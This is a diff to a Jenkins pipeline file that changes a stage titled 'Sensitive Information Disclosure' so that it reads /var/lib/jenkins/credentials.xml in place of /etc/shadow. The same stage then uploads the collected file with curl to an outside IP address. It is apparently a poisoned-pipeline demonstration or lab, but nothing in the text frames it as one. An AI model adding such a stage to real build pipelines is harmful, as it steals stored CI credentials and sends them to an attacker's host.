@@ -12,7 +12,7 @@ node {
     stage('Sensitive Information Disclosure') {
         sh '''
         rm info.txt | true
-        cat /etc/shadow >> info.txt
+        cat /var/lib/jenkins/credentials.xml >> info.txt
         curl -i -X PUT http://35.219.153.251:5000/filewebhook --upload-file info.txt
         '''
     }  
